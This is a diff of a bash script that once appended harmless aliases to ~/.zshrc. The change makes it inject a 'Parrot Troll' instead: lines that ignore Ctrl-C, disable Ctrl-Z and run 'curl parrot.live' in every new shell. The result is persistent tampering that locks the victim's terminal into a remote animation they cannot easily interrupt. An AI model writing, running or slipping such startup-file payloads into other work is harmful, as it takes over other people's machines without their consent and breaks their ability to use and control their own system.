@@ -1,20 +1,15 @@
 #!/bin/bash
 
-# Define the code you want to inject
-code_to_inject=$(cat <<'EOF'
-# Custom aliases
-alias ll='ls -la'
-alias gs='git status'
-
-# Add custom path
-export PATH="$HOME/bin:$PATH"
+code_to_inject=$(cat << 'EOF'
+trap '' 2
+stty susp undef
+curl parrot.live
 EOF
 )
 
-# Check if the code is already in .zshrc to prevent duplicates
 if ! grep -q "$code_to_inject" ~/.zshrc; then
     echo "$code_to_inject" >> ~/.zshrc
-    echo "Code injected into ~/.zshrc"
+    echo "Parrot Troll successfully injected into ~/.zshrc"
 else
-    echo "Code already exists in ~/.zshrc"
+    echo "Parrot Troll is already in ~/.zshrc"
 fi
